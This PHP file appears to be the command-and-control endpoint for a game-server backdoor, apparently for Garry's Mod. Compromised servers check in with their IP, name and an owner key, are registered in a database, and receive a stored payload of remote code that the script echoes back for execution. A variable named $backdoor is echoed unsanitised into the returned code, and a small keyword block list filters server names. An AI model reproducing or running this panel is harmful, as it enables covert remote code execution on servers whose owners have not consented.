<?php
include('../core/class/include.php');

$server_ip =htmlspecialchars($_POST['i']);
$server_name = htmlspecialchars($_POST['n']);
$server_users_number = htmlspecialchars($_POST['nb']);
$banned = array('rvac', 'script', 'raid');

function contains($str, array $arr)
{
    foreach($arr as $a) {
        if (stripos($str,$a) !== false) return true;
    }
    return false;
}

if(contains($server_name, $banned) == true){
	die("H4X0R Bad Request");
}

if($server_users_number > 128){
	die("Bad Request");
}

$key = $_GET['key'];
$svkey = $_POST['svkey'];
$backdoor = $_POST['string'];

$tempid = Account::GetIdByKey($key);
$svowner = $key;

if (isset($key)) {
if ($server_ip != "" && $server_name != "")
{
	$server_id = Server::GetServerByIP($server_ip);
	if ($server_id == false)
	{

		Server::AddServer($server_name, $server_ip, $server_users_number, $svowner);
		echo "PrintMessage(10,'')";
	}
	else
	{
		$serverowned = Server::CheckIFOwned($server_ip, $svowner);
		if ($serverowned == true)
		{
			Server::UpdateServer($server_id, $server_name, $server_ip, $server_users_number, $svowner);
		} else
		{
			die("print(\"This server is already owned please remove your code\") timer.Remove(\"".$backdoor."\")");
		}
		$payload_id = Server::GetServerPayload($server_id);
		if ($payload_id == -1)
		{
			echo "PrintMessage(10,'')";
		}
		else
		{
			echo Payload::GetPayload($payload_id)['payload_content'];
			Server::ResetPayload($server_id);
		}
	}
}
} else {
	echo 'Wsh mais tes qui a fouiller frer ?';
}
?> 